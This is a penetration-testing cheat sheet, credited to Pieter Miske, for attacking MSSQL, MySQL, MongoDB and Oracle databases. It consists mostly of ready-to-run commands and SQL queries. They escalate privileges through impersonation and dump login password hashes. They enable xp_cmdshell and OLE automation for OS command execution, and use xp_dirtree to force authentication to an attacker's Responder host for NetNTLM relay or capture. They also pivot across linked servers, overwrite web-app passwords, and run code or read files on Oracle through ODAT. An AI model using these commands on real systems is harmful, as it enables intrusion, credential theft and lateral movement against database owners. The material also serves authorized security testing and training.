# __Database enumeration and exploitation__
>Author: Pieter Miske
---
### __MSSQL database:__
While enumerating keep the following things in mind: OS commands from inside the MSSQL Server runs in the context of the MSSQL Server service account; MSSQL Server service accounts have sysadmin privileges by default; Organizations usually utilize a single domain account to run many MSSQL Servers\. 

##### _Run SQL query methods:_
- \([SQLRecon](https://github.com/skahwah/SQLRecon)\): `SQLRecon.exe -a Windows -s <MSSQL server name> -d master -m query -o "<query>"`
- \([PowerUpSQL](https://github.com/NetSPI/PowerUpSQL)\): `Get-SQLQuery -Verbose -Instance "<database instance name>" (-Username <(domain)\<username> -Password <password>) -Q “<normal MSSQL query>"`
- \([impacket](https://github.com/SecureAuthCorp/impacket)\): `impacket-mssqlclient.py (<DOMAIN>/)<USERNAME>:<PASSWORD>@<IP> (-windows-auth)`
- Can be used in the case MSSQL server can be reached via a SQL injection vulnerability \([SQLmap](https://github.com/sqlmapproject/sqlmap)\): `sqlmap -r <web.req> --sql-shell`

##### _Database instance and access enumeration:_
- List as what user you are logged in, mapped as and what roles exist \(SQLRecon\): `SQLRecon.exe -a Windows -s <MSSQL server name> -d master -m whoami`
- List running SQL servers:
	- Identify domain joined SQL servers \(PowerUpSQL\): `Get-SQLInstanceDomain -Verbose`
	- Identify local running SQL servers \(PowerUpSQL\): `Get-SQLInstanceLocal -Verbose`
- Gather more information about the found instance \(PowerUpSQL\): `Get-SQLServerInfo -Instance "<database instance name>"`

##### _Escalate from public user to sysadmin:_
- Audit the MSSQL database instance for vulnerabilities \([PowerUpSQL](https://github.com/NetSPI/PowerUpSQL)\): `Invoke-SQLAudit -Instance <database instance name>`
- Scan for privilege escalation vulnerabilities and exploit them automatically \(if successful the current domain user will be added to the MSSQL Login users with sysadmin privileges and can only be deleted if the domain user is logged off\) \(PowerUpSQL\): `Invoke-SQLEscalatePriv -Verbose -Instance <database instance name>`
- Check for impersonate privilege misconfiguration \(if a user account with 'public' access to the MSSQL database has the 'Impersonate' privilege over a account with higer privs, this can be abused\):
	- \([SQLRecon](https://github.com/skahwah/SQLRecon)\):
		- Enumerate any user accounts that can be impersonated: `SQLRecon.exe -a Windows -s <MSSQL server name> -d master -m impersonate`
		- Enumerate privs user that can be impersonated: `SQLRecon.exe -a Windows -s <MSSQL server name> -d master -m iwhoami -i <user to impersonate>`
		- Execute an arbitrary SQL query as an impersonated user: `SQLRecon.exe -a Windows -s <MSSQL server name> -d master -m iquery -i <user to impersonate> -o "<query>"`
	- SQL query:
		- 1\. Check which logins \(not user’s\) allow for impersonation \(SQL query\): `SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE'`
		- 2\. Impersonation:
			- Database login \(SQL query\): `EXECUTE AS LOGIN = '<login name>';`
			- Database user \(SQL query\): `use msdb; EXECUTE AS USER = 'dbo';`

##### _Gather MSSQL login names and hashes:_
- List login names \(SQL query\): `select sp.name as login, case when sp.is_disabled = 1 then 'Disabled' else 'Enabled' end as status from sys.server_principals sp left join sys.sql_logins sl on sp.principal_id = sl.principal_id where sp.type not in ('G', 'R') order by sp.name;`
- Dump hashes if enough privileges \(SQL query\): `select sp.name as login, sl.password_hash, case when sp.is_disabled = 1 then 'Disabled' else 'Enabled' end as status from sys.server_principals sp left join sys.sql_logins sl on sp.principal_id = sl.principal_id where sp.type not in ('G', 'R') order by sp.name;`

##### _Escalate from MSSQL sysadmin to MSSQL service account:_
- OS command execution via xp\_cmdshell: 
	- 1\. Enable xp\_cmdshell for code execution \(SQL query\): 
		- `EXEC sp_configure 'show advanced options', '1' RECONFIGURE `
		- `EXEC sp_configure 'xp_cmdshell', '1'  RECONFIGURE`
	- 2\. Verify if xp\_cmdshell is enabled \(SQL query\): `SELECT name, CONVERT(INT, ISNULL(value, value_in_use)) AS IsConfigured FROM sys.configurations WHERE name = 'xp_cmdshell';`
	- 3\. Execute commands \(SQL query\): `EXEC xp_cmdshell '<command>';`
- OS command via OLE\-based procedure: because the 'xp\_cmdshell' technique is well known, it may be monitored or removed completely and therefore this method, based on sp\_OACreate and sp\_OAMethod, may still work\:
	- 1\. Enable OLE \(SQL query\): `EXEC sp_configure 'Ole Automation Procedures', 1; RECONFIGURE;`
	- 2\. Run code \(SQL query\): `DECLARE @myshell INT; EXEC sp_oacreate 'wscript.shell', @myshell OUTPUT; EXEC sp_oamethod @myshell, 'run', null, 'cmd /c "<command to run>"';`
- Relay/Capture NetNTLM hash via xp\_dirtree:
	- Relay MSSQL service account authentication in an attempt to get local admin access to the target system\. For this relay attack to work, it is mandatory that the target server has smb signing off and the relayed MSSQL service account is local admin there\.
		- 1\. Start Responder \(turn SMB and HTTP off\): `python Responder.py -I <interface> -v`
		- 2\. Follow the ‘Get initial system level access via SMB relay attack’ instructions to setup ntlmrelayx 
		- 3\. Run the following query to start the relay attack \(SQL query\): `EXEC xp_dirtree '\\<IP to reach responder>\test', 1, 1`
	- Capture NetNTLM hash:
		- 1\. In an elevated beacon run Inveigh or use Responder \(if the target server can reach it\) to capture the NetNTLM hash \([Inveigh](https://github.com/Kevin-Robertson/Inveigh)\): `Inveigh.exe -DNS N -LLMNR N -LLMNRv6 N -HTTP N -FileOutput N -MachineAccounts Y`
		- 2\. Run the following query to capture the hash \(SQL query\): `EXEC xp_dirtree '\\<ip inveigh>\test', 1, 1`

##### _Identify linked MSSQL servers:_
SQL Servers have a concept called "Linked Servers", which allows a database instance to access data from an external source like another MSSQL server\. These can be located in other domains, forests or in the cloud\. Compromising a linked MSSQL server is also a great way for moving laterally\. 
- \([SQLRecon](https://github.com/skahwah/SQLRecon)\): `SQLRecon.exe -a Windows -s <MSSQL server name> -d master -m links`
- SQL query: `SELECT srvname FROM master..sysservers;`
- \([PowerUpSQL](https://github.com/NetSPI/PowerUpSQL)\): `Get-SQLServerLinkCrawl -Instance "<database instance name>"`

##### _Lateral movement via linked MSSQL server:_
>There is no max to the linked servers that can be reached and exploited this way but pay close attention to the correctness of the used quotes\.
- Enable 'xp\_cmdshell' on SQL linked server: this method requires that the 'RPC out' function is enabled on both the local\- and the remote database instance\. This is not the default\. Without it, RCE is not possible\. 
	- \([SQLRecon](https://github.com/skahwah/SQLRecon)\):
		- 1\. See what user you are logged in as on the linked SQL server: `SQLRecon.exe -a Windows -s <MSSQL server name> -d master -l <target MSSQL server> -m lwhoami`
		- 2\. Enable RPC and RPC out: `SQLRecon.exe -a Windows -s <MSSQL server name> -d master -l <target MSSQL server> -m lenablerpc`
		- 3\. Enable xp\_cmdshell: `SQLRecon.exe -a Windows -s <MSSQL server name> -d master -l <target MSSQL server> -m lenablexp`
	- SQL query:
		- 1\. Check if ‘RPC out’ is enabled on the current and the remote database \(without openquery syntax for current database\) \(SQL query\): `select * from openquery("<target MSSQL server>",'select srvname,rpc,rpcout from master..sysservers')`
		- 2\. \(optional\) if 'RPC out' is disabled on the current database try to enable it \(SQL query\): `EXEC sp_serveroption @server = '<remote database name>', @optname = 'rpc out', @optvalue = 'on';`
		- 3\. Enable xp\_cmdshell on remote database \(SQL query\): `EXECUTE('sp_configure ''show advanced option'',1;reconfigure;') AT "<remote MSSQL database>" EXECUTE('sp_configure ''xp_cmdshell'',1;reconfigure;') AT "<remote MSSQL database>"`
		- 4\. Verify if successful \(SQL query\): `select * from openquery("<remote MSSQL database>",'SELECT name, CONVERT(INT, ISNULL(value, value_in_use)) AS IsConfigured FROM sys.configurations WHERE name = ''xp_cmdshell'';');`
- Execute code on the first linked MSSQL server: 
	- \([SQLRecon](https://github.com/skahwah/SQLRecon)\): `SQLRecon.exe -a Windows -s <MSSQL server name> -d master -l <target MSSQL server> -m lxpcmd -o "<command>"`
	- SQL query: `select * from openquery("<SQL linked server>", 'select @@servername; exec xp_cmdshell ''<command>''')`
- Execute code on the second linked MSSQL server \(SQL query\):  `select * from openquery("<1st SQL linked server>", 'select * from openquery("<2nd SQL linked server>", ''select @@servername; exec xp_cmdshell ''''<command>'''''')')`
- Check for bidirectional SQL link misconfiguration that allows for the execution of SQL queries from the context of the target MSSQL server back on the current MSSQL server as a sysadmin user:
	- 1\. Check in which context the target database instance login user can run SQL queries in the current database instance \(SQL query\): `select mylogin from openquery("<remote database name>", 'select mylogin from openquery("<current database name>", ''select SYSTEM_USER as mylogin'')')`
	- 2\. Enable 'xp\_cmdshell' on the current database instance via the target database instance \(SQL query\):
		- `EXEC ('EXEC (''sp_configure ''''show advanced options'''', 1; reconfigure;'') AT <current database name>') AT <remote database name>`
		- `EXEC ('EXEC (''sp_configure ''''xp_cmdshell'''', 1; reconfigure;'') AT <current database name>') AT <remote database name>`
	- 3\. Run code on the current database instance \(SQL query\): `EXEC ('EXEC (''xp_cmdshell ''''<Command>'''''') AT <current database name>) AT <remote database name>`

##### _Database content enumeration:_
- MSSQL queries to list the content of the database:
	- List databases: `SELECT name FROM master..sysdatabases;`
	- List tables: `SELECT name FROM <database name>..sysobjects WHERE xtype = 'U';`
	- List columns: `SELECT <database name>..syscolumns.name, TYPE_NAME(<databasename>..syscolumns.xtype) FROM <database name>..syscolumns, <databasename>..sysobjects WHERE <database name>..syscolumns.id=<databasename>..sysobjects.id AND <database name>..sysobjects.name='<table name>';`
	- Dump content column: `SELECT <column name> FROM <database_name>..<corresponding table name>;`
- Search database content over SQL links: 
	- List databases and tables \(SQL query\): `select * from openquery("<target MSSQL server>", 'select * from information_schema.tables')`
	- List Columns \(SQL query\): `select * from openquery("<target MSSQL server>", 'select column_name from master.information_schema.columns')`
	- Dump content column \(SQL query\): `select * from openquery("<target MSSQL server>", 'select <column name> from master.dbo.<table name>')`


---
### __MySQL/MariaDB database:__
##### _Access to database:_
- Login to database instance: `(proxychains4) mysql -h <server ip> -u <db username> (-p db_name)`

##### _Interact with database:_
- Display all databases: `show databases;`
- Select database: `use <database name>;`
- Show all tables: `show tables;`
- Display content table: `ELECT * FROM <table>;`
- List all users: `SELECT User,Host FROM mysql.user;`
- If you have root access to the database and the database is storing  user credentials for e\.g\. a web application, just change the password \(some CMS require an alternative command to run in mysql to create a valid new password\): `UPDATE <user table name> SET <password column> = md5('new password') WHERE <user or id column> = <username or id of user to change pw>;`


---
### __MongoDB atabase:__
>For more info, check this MongoDB [cheat sheet](https://book.hacktricks.xyz/pentesting/27017-27018-mongodb).
- 1\. Download and unpack the mongo binary:
	- [New version](https://www.mongodb.com/download-center/community/releases/archive) \(select \.tgz type\)
	- [Legacy version](https://fastdl.mongodb.org/linux/mongodb-linux-x86_64-3.6.17.tgz)
- 2\. Export binary location to current session: `export PATH=/root/mongodb-linux-x86_64-3.6.17/bin:$PATH`
- 3\. Start remote connection: `mongo --host <target host> --port 27017 -u "" -p ""`
- 4\. Use the MongoDB command:
	- List available databases: `show dbs`
	- Use a specific database: `use <db name>`
	- List the collections from the database: `show collections`
	- Dump content of the collection: `db.<collection>.find()`


---
### __Oracle atabase:__
Oracle database \(tcp 1521, 1522\-1529\) is a relational database management system \(RDBMS\)\. Oracle databases use Transparent Network Substrate \(TNS\)\. A proprietary Oracle computer\-networking technology that supports homogeneous peer\-to\-peer connectivity on top of other networking technologies such as TCP/IP\. 

##### _Access and database information:_
>More information about pentesting Oracle DB's can be found [here](https://book.hacktricks.xyz/pentesting/1521-1522-1529-pentesting-oracle-listener).
- 1\. Enumerate TNS listener version: `nmap --script "oracle-tns-version" -p 1521 -T4 -sV <IP>`
- 2\. Search for a valid SID, find a valid Oracle accounts and identify the privileges of that account:
	- 1\. Install ODAT: 
		- 1\. \(optional\) If not using Kali Linux, [download](http://www.oracle.com/technetwork/topics/linuxx86-64soft-092277.html) a 19\.11 version client basic, sdk \(devel\) and sqlplus instance, and put them in the same directory as the bash script \(step 2\): 
		- 2\. Make a bash file to download the tool and install all the needed dependencies: 
            ```bash
            #!/bin/bash
            git clone https://github.com/quentinhardy/odat.git
            cd odat/
            git submodule init
            git submodule update
            cd ../
            sudo apt-get -y install libaio1 python3-dev alien
            #sudo alien --to-deb oracle-instantclient19.11-basic-19.11.0.0.0-1.x86_64.rpm
            #sudo alien --to-deb oracle-instantclient19.11-devel-19.11.0.0.0-1.x86_64.rpm
            #sudo dpkg -i oracle-instantclient19.11-basic_19.11.0.0.0-2_amd64.deb
            #sudo dpkg -i oracle-instantclient19.11-devel_19.11.0.0.0-2_amd64.deb
            #echo "export ORACLE_HOME=/usr/lib/oracle/19.11/client64" >> ~/.zshrc
            #echo "export LD_LIBRARY_PATH=$LD_LIBRARY_PATH:$ORACLE_HOME/lib" >> ~/.zshrc
            #echo "export PATH=${ORACLE_HOME}bin:$PATH" >> ~/.zshrc
            pip3 install cx_Oracle
            sudo apt-get install python3-scapy
            sudo pip3 install colorlog termcolor pycrypto passlib python-libnmap
            sudo pip3 install argcomplete
            sudo activate-global-python-argcomplete
            sudo pip3 install pyinstaller
            "Done! test with python3 odat.py -h"
            ```
	- 2\. Start enumeration: `python3 odat.py all -s <target IP> -p <PORT>`

##### _Attack Oracle database:_
- Remote Code Execution: 
	- Execute Code via Java Stored Procedure: `python3 odat.py java -s <IP> -U <username> -P <password> -d <SID> --exec <COMMAND>`
	- Execute code via External Tables: `python3 odat.py externaltable -s <IP> -U <username> -P <password> -d <SID> --exec "C:/windows/system32" "calc.exe"`
- Read/write files:
	- Read file: `python3 odat.py utlfile -s <IP> -d <SID> -U <username> -P <password> --getFile "<remote path>" <remote file name> <local file name>`
	- Write file: `python3 odat.py utlfile -s <IP> -d <SID> -U <username> -P <password> --putFile "<remote path>" <remote file name> <local file name>`
- Escalate privileges \(multiple options available\): `python3 odat.py privesc s <IP> -U <username> -P <password> -d <SID> -h`
